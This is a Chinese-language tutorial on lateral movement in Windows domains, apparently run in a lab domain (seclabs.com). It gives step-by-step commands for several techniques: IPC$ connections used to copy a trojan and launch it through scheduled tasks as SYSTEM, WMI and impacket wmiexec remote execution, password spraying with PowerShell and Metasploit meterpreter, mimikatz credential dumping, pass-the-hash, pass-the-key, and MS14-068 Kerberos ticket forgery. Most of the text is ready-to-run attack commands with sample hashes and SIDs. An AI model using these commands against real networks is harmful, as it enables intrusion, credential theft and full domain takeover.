1、IPC横向攻击

1.1 简介

IPC(Internet Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，使用139、445端口。

1.2 利用条件

1、目标机开启了139和445端口；

2、目标主机管理员开启了ipc$默认共享；

3、知道目标机的账户密码。

1.3 命令方法

1.建立IPC连接

net use \\192.168.207.50\ipc$ "admin@123" /user:"seclabs.com\administrator"

2.查看IPC连接

net use

3.断开连接

net use \\192.168.207.50\ipc$ /del

1.4 利用方法

建立IPC连接后可以使用计划任务执行木马上线

1.拷贝木马到远端服务器

copy artifact.exe \\192.168.207.50\c$

登录远端服务器查看已经存在

2.Windows2008 创建计划任务

低于Windows2012使用at进行计划任务
高于等于Windows2012使用schtasks

1.查看远控机器时间

net time \\192.168.207.52

2.Windows2008创建计划任务

at \\192.168.207.52 15:49 c:\artifact.exe

3.主机成功上线

4.Windows2012创建计划任务

1.查询远端计划任务

# 设置编码方式
chcp 437

# 查询计划任务
SCHTASKS /Query /S 192.168.207.50 /U seclabs.com\Administrator /P "admin@123"

注：由于简体中文的 schtasks MUI 语言包有问题，导致 schtasks /query 显示错误，解决办法是先输入chcp 437，将当前的命令提示符的代码页设置为美国英语

2. 查询远端主机时间

net time \\192.168.207.50

3. 创建计划任务

SCHTASKS /Create /S 192.168.207.50 /U seclabs.com\Administrator /P "admin@123" /SC ONCE /ST 15:30 /TN aaa /TR c:\artifact.exe /RU system

/Create   #创建
/S        #远程主机
/U        #用户名
/P        #密码
/SC       #任务运行频率
/ST       #运行时间
/TN       #任务名称
/TR       #命令路径
/RU       #运行权限

4.木马执行成功

2、WMI横向攻击

2.1 简介

WMI全称“windows管理规范”，从win2003开始一直存在。它原本的作用是方便管理员对windows主机进行管理。因此在内网渗透中，我们可以使用WMI进行横向移动。

2.2 利用条件

1、WMI服务开启，端口135，默认开启
2、防火墙允许135、445等端口通信
3、知道目标机的账户密码

2.3 利用方法

1.wmic利用

无需上传第三方软件，利用系统内置程序,单命令执行，执行后无结果回显。

1.执行方法

wmic /node:dc /user:seclabs.com\administrator /password:admin@123  process call create "cmd.exe /c ipconfig>c:\result.txt"

2.执行结果

在DC主机上查看执行结果

2.wmiexec（impacket工具）

1.依赖软件

https://github.com/SecureAuthCorp/impacket

2.利用方法-用户名密码

cd impacket/examples
python3 wmiexec.py seclabs.com/administrator:'admin@123'@192.168.207.50 "whoami"

3.利用方法-HASH

使用mimikatz获取HASH信息

python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4 seclabs.com/administrator@192.168.207.50 "whoami"

如果HASH值错误会提示失败

4、密码喷射攻击

4.1 简介

通常情况下，穷举攻击是固定好用户名，利用多个密码尝试验证。与穷举攻击相反，密码喷洒攻击是固定好密码，尝试多个用户名进行验证，在域系统中，员工往往因为初始入域的密码未进行修改导致被攻击者采取密码喷洒的方式获取权限

4.2 利用方法

1.使用DomainPasswordSpray攻击

1.下载链接

https://github.com/dafthack/DomainPasswordSpray

2.绕过powershell执行策略

powershell.exe -exec bypass

3.导入模块

Import-Module .\DomainPasswordSpray.ps1

4.设置单个密码

Invoke-DomainPasswordSpray -Password admin@123

2.使用MSF进行密码喷射

1.使用MSF进行配置

use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set smbuser user.txt
set smbpass passwd.txt
set rhost 192.168.207.0/24
run

2.测试效果

5、PTH-哈希传递

5.1 简介

PTH，即Pass The Hash，通过找到与账号相关的密码散列值(通常是NTLM Hash)来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。

5.2 利用条件

1、在工作组环境中：
Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问


2、在域环境中：
只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器
如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1

5.3 利用方法

1.使用mimikatz进行PTH攻击

1.查看域控目录

shell dir \\192.168.207.50\c$

2.使用mimikatz

mimikatz privilege::debug

注：普通域控用户无权限运行mimikatz，需要本地开启注册表策略

reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

3.使用PTH进行攻击

mimikatz sekurlsa::pth /user:administrator /domain:seclabs.com /ntlm:579da618cfbfa85247acf1f800a280a4

获取到PID为1704

4.窃取PID

steal_token 1704

5.查看域控目录

shell dir \\192.168.207.50\c$

6、PTK-AES Key传递

6.1 简介

即Pass The Key ，当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash.也就失去了作用，但是可以通过pass the key的攻击方式获得权限。

1、WinXP/2003/Vista/2008 ，以及未打 KB2871997 补丁之前（AES 不可用或不可替代）的 Win7/2008r2/8/2012，这些环境我们都可以使用NTLM哈希传递

2、对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NTLM来进行验证

6.2 利用条件

微软也对pth打过补丁，然而在测试中发现，在打了补丁后，常规的Pass The Hash已经无法成功，唯独默认的Administrator(SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程ipc连接。

默认情况下使用RC4进行加密认证，使用mimikatz获取不到AES256信息

6.3 环境部署

1.对 Microsoft Active Directory 域客户机强制实施加密算法

从 Microsoft Windows Server 2008 R2 开始，管理员可以强制实施要在参与 Microsoft Active Directory 域客户机上使用的 Kerberos 加密算法。

1.使用gpmc.msc打开组策略控制台

找到相关域。然后，选择缺省域策略

2.打开组策略管理编辑器

右键单击缺省域策略，然后单击编辑。这将打开组策略管理编辑器

3.配置安全性选项

单击计算机配置 > 策略 > Windows 设置 > 安全设置 > 本地策略 > 安全性选项

4.设置kerberos加密类型

双击网络安全性：配置 Kerberos 允许的加密类型

5.设置加密类型耦合

要允许使用 AES-256 加密（这是缺省策略设置），请选择 RC4_HMAC_MD5、AES128_HMAC_SHA1 和 AES256_HMAC_SHA1

要禁止使用 AES 256 位 (AES-256) 加密，请选择 RC4_HMAC_MD5 和 AES128_HMAC_SHA1

2.对 Microsoft Active Directory 域控制器强制实施加密算法

1.使用gpmc.msc打开组策略控制台

找到相关域。然后，选择缺省域控制器策略

2.打开组策略管理编辑器

右键单击缺省域控制器策略，然后单击编辑。这将打开组策略管理编辑器

3.配置安全性选项

单击计算机配置 > 策略 > Windows 设置 > 安全设置 > 本地策略 > 安全性选项

4.设置kerberos加密类型

双击网络安全性：配置 Kerberos 允许的加密类型

5.设置加密类型耦合

要允许使用 AES-256 加密（这是缺省策略设置），请选择 RC4_HMAC_MD5、AES128_HMAC_SHA1 和 AES256_HMAC_SHA1

要禁止使用 AES 256 位 (AES-256) 加密，请选择 RC4_HMAC_MD5 和 AES128_HMAC_SHA1

6.4 利用方法

1.获取域控管理员AES256值

mimikatz sekurlsa::ekeys

2.使用mimikatz进行PTK连接

privilege::debug
sekurlsa::pth /user:administrator /domain:seclabs.com /aes256:d52b115130243b8d9fcdeaccfb9812607412018f1dbfe9f680e6a54b8fc106f9

3.测试使用PTH攻击

测试使用域控管理员账号进行攻击

sekurlsa::pth /user:administrator /domain:seclabs.com /ntlm:789492fb036fdbf79a773d62ac043dce

7、PTT-票据传递（MS14-068）

7.1 简介

MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。

7.2 影响版本

Microsoft Windows Server 2003 SP2
Windows Vista SP2
Windows Server 2008 SP2 and R2 SP1
Windows 7 SP1
Windows 8
Windows 8.1
Windows Server 2012 Gold and R2

7.3 利用条件

1.域控没有打MS14-068的补丁(KB3011780)
2.拿下一台加入域的计算机
3.有这台域内计算机的域用户密码和Sid

7.4 利用方法

1.下载地址

https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

2.获取域内用户信息

1.如果是域内用户

whoami /user

2.域内用户获取密码

使用mimikatz获取密码

privilege::debug
sekurlsa::logonPasswords

3.获取域控域名

net time /domain

3.伪造kerberos协议认证证书

1.查看主机访问权限

shell dir \\192.168.207.50\c$

2.清除当前主机票据

# 列出当前票据
mimikatz kerberos::list

# 清除票据
mimikatz kerberos::purge

3.上传ms14-068

shell cd c:\
shell dir

4.使用MS14-068攻击

shell ms14-068.exe -u web@seclabs.com -p admin@112233 -s S-1-5-21-3864002930-708215365-3478260457-1604 -d seclabs.com

5.导入票据

mimikatz kerberos::ptc TGT_web@seclabs.com.ccache

6.查看域控目录信息

shell dir \\DC.seclabs.com\c$
